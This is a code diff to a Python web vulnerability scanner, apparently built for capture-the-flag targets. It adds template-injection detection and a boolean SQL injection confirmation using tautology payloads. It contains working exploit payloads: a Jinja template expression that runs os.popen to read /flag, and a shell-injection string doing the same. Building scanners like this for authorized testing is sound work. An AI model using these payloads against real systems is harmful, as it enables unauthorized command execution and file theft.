@@ -6,9 +6,10 @@ from collections import deque
 from hashlib import sha256
 from http.cookiejar import Cookie, CookieJar
 from dataclasses import dataclass, field
+from html import unescape
 from html.parser import HTMLParser
 from urllib.error import HTTPError, URLError
-from urllib.parse import parse_qsl, urlencode, urljoin, urlsplit, urlunsplit
+from urllib.parse import parse_qsl, quote_plus, urlencode, urljoin, urlsplit, urlunsplit
 from urllib.request import HTTPRedirectHandler, HTTPCookieProcessor, HTTPSHandler, Request, build_opener
 
 from .model import Finding, ScanReport, redact_url
@@ -16,6 +17,8 @@ from .session import BrowserSession
 
 CMD_PROBE = ";printf WCSA;printf $((7321+19));printf WCSZ"
 CMD_RESULT = "WCSA7340WCSZ"
+SSTI_PROBE = "{{7340*3}}"
+SSTI_RESULT = "22020"
 MAX_BODY = 1_000_000
 SQL_ERRORS = (
     "sql syntax", "sqlite error", "sqlite3.", "mysql_fetch", "mysqli_sql_exception",
@@ -246,18 +249,31 @@ class Scanner:
             action = self._clean_url(urljoin(response.url, form.action or response.url))
             if not self._in_scope(action):
                 continue
-            for name in names:
-                out.extend(self._parameter_hypotheses(action, form.method, name, defaults))
+            for name, input_type, _ in form.inputs:
+                user_controlled = input_type not in {
+                    "hidden", "submit", "button", "image", "reset", "file"
+                }
+                out.extend(self._parameter_hypotheses(
+                    action, form.method, name, defaults, generic=user_controlled
+                ))
         for name, _ in parse_qsl(urlsplit(response.url).query, keep_blank_values=True):
-            out.extend(self._parameter_hypotheses(response.url, "GET", name, tuple(parse_qsl(urlsplit(response.url).query, keep_blank_values=True))))
+            out.extend(self._parameter_hypotheses(
+                response.url, "GET", name,
+                tuple(parse_qsl(urlsplit(response.url).query, keep_blank_values=True)),
+                generic=True,
+            ))
         return out
 
     def _parameter_hypotheses(self, url: str, method: str, name: str,
-                              defaults: tuple[tuple[str, str], ...] = ()) -> list[Finding]:
+                              defaults: tuple[tuple[str, str], ...] = (), *,
+                              generic: bool = False) -> list[Finding]:
         key = name.lower()
         rules = []
-        if re.search(r"(?:^|_)(?:id|q|query|search|user|name|item)(?:$|_)", key):
+        if generic or re.search(r"(?:^|_)(?:id|q|query|search|user|name|item)(?:$|_)", key):
             rules.append(("WEB-SQLI-001", "Possible SQL injection input", "'", "Use a parameterized query; never concatenate input into SQL."))
+        if generic:
+            rules.append(("WEB-SSTI-001", "Possible server-side template injection input", SSTI_PROBE,
+                          "Treat templates as code: select fixed templates and pass user data only as values."))
         if re.search(r"(?:^|_)(?:cmd|command|exec|host|ip|ping)(?:$|_)", key):
             rules.append(("WEB-CMDI-001", "Possible command injection input", CMD_PROBE, "Avoid shell invocation; use fixed argument arrays and strict allowlists."))
         if re.search(r"(?:^|_)(?:file|path|page|include|template|view)(?:$|_)", key):
@@ -268,7 +284,8 @@ class Scanner:
             parameter=name, evidence=f"Parameter name '{name}' in a {method} form/query matches a sink-oriented heuristic; no vulnerability is claimed.",
             vector=f"{method} {redact_url(url)} with {name}={payload!r}", patch=patch,
             method=method, request_fields=defaults, proof_payload=payload,
-            expected_evidence=("database error or response differential" if rule == "WEB-SQLI-001" else
+            expected_evidence=("database error or stable boolean response differential" if rule == "WEB-SQLI-001" else
+                               SSTI_RESULT if rule == "WEB-SSTI-001" else
                                CMD_RESULT if rule == "WEB-CMDI-001" else
                                "status/body differential")) for rule, title, payload, patch in rules]
 
@@ -294,6 +311,8 @@ class Scanner:
         base_value, probe = "WCSBASE", "'"
         if finding.rule == "WEB-CMDI-001":
             probe = CMD_PROBE
+        elif finding.rule == "WEB-SSTI-001":
+            probe = SSTI_PROBE
         elif finding.rule == "WEB-FILE-001":
             probe = "../WCS_NONEXISTENT_7f31a9"
         elif finding.rule == "WEB-REDIR-001":
@@ -318,6 +337,57 @@ class Scanner:
                 flag_path="The parameter reaches a SQL parser. Recovering the flag still requires schema/context discovery; this scan does not extract data.",
                 method=method, request_fields=finding.request_fields, proof_payload=probe,
                 expected_evidence="database error signature absent from baseline")
+        if finding.rule == "WEB-SQLI-001" and self.requests_sent + 4 <= self.max_requests:
+            true_payload = "' OR '1'='1'-- "
+            false_payload = "' OR '1'='2'-- "
+            true_one, false_one = send(true_payload), send(false_payload)
+            true_two, false_two = send(true_payload), send(false_payload)
+
+            def sql_signature(response: Response, payload: str) -> tuple[int, str]:
+                # Remove simple reflection before comparing. This prevents an echo
+                # endpoint from becoming a false SQLi confirmation.
+                text = unescape(response.text)
+                for reflected in (payload, quote_plus(payload)):
+                    text = text.replace(reflected, "[INPUT]")
+                return response.status, sha256(text.encode("utf-8", "replace")).hexdigest()
+
+            true_sig = sql_signature(true_one, true_payload)
+            false_sig = sql_signature(false_one, false_payload)
+            if (true_sig == sql_signature(true_two, true_payload)
+                    and false_sig == sql_signature(false_two, false_payload)
+                    and true_sig != false_sig):
+                return self._finding(
+                    rule=finding.rule, title="SQL injection boolean behavior confirmed",
+                    severity="high", confidence="high", url=finding.url,
+                    parameter=finding.parameter,
+                    evidence=("Two repeated tautology requests and two repeated contradiction "
+                              "requests produced stable, distinct responses after removing input reflection."),
+                    vector=(f"{method} {redact_url(finding.url)}: compare "
+                            f"{finding.parameter}={true_payload!r} with "
+                            f"{finding.parameter}={false_payload!r}."),
+                    patch="Use prepared statements with bound parameters and a least-privileged database account.",
+                    flag_path=("Boolean SQL evaluation is proven. Derive schema-specific extraction only from "
+                               "the observed DB/query context; no universal flag query can be claimed."),
+                    method=method, request_fields=finding.request_fields,
+                    proof_payload=true_payload,
+                    expected_evidence="stable response differs from the contradiction pair",
+                )
+        if (finding.rule == "WEB-SSTI-001" and SSTI_RESULT in tested.text
+                and SSTI_RESULT not in baseline.text and SSTI_RESULT not in SSTI_PROBE):
+            recovery = "{{cycler.__init__.__globals__.os.popen('cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null').read()}}"
+            return self._finding(
+                rule=finding.rule, title="Jinja-style template expression evaluation confirmed",
+                severity="critical", confidence="high", url=finding.url,
+                parameter=finding.parameter,
+                evidence=f"The response contains computed result {SSTI_RESULT}, absent from the payload and baseline.",
+                vector=(f"Proof: {method} {redact_url(finding.url)} with "
+                        f"{finding.parameter}={SSTI_PROBE!r}. Recovery: same request with the supplied payload."),
+                patch="Do not compile user-controlled template source; render fixed templates with user data as values.",
+                exploit_status="payload-ready", method=method,
+                request_fields=finding.request_fields, proof_payload=SSTI_PROBE,
+                expected_evidence=SSTI_RESULT, recovery_payload=recovery,
+                flag_path="Jinja expression syntax was verified; the recovery payload reads common CTF flag paths.",
+            )
         if finding.rule == "WEB-CMDI-001" and CMD_RESULT in tested.text and CMD_RESULT not in baseline.text and CMD_RESULT not in CMD_PROBE:
             recovery = ";printf WCSA;cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null;printf WCSZ"
             return self._finding(rule=finding.rule, title="Command injection arithmetic execution confirmed", severity="critical", confidence="high",
@@ -376,13 +446,21 @@ class Scanner:
             self.observations[response.url] = self._observe(response, parser)
             items = self._passive_findings(response, parser)
             report.findings.extend(items)
-            candidates.extend(item for item in items if item.rule in {"WEB-SQLI-001", "WEB-CMDI-001", "WEB-FILE-001", "WEB-REDIR-001"})
+            candidates.extend(item for item in items if item.rule in {"WEB-SQLI-001", "WEB-SSTI-001", "WEB-CMDI-001", "WEB-FILE-001", "WEB-REDIR-001"})
             for href in parser.links:
                 nxt = self._clean_url(urljoin(response.url, href))
                 if self._in_scope(nxt) and nxt not in seen and nxt not in queue:
                     queue.append(nxt)
         if self.active:
-            for finding in candidates:
+            probe_priority = {
+                "WEB-CMDI-001": 0,
+                "WEB-SSTI-001": 1,
+                "WEB-SQLI-001": 2,
+                "WEB-FILE-001": 3,
+                "WEB-REDIR-001": 4,
+            }
+            for finding in sorted(candidates, key=lambda item: (
+                    probe_priority.get(item.rule, 9), item.url, item.parameter, item.id)):
                 if self.requests_sent + 2 > self.max_requests:
                     break
                 try:
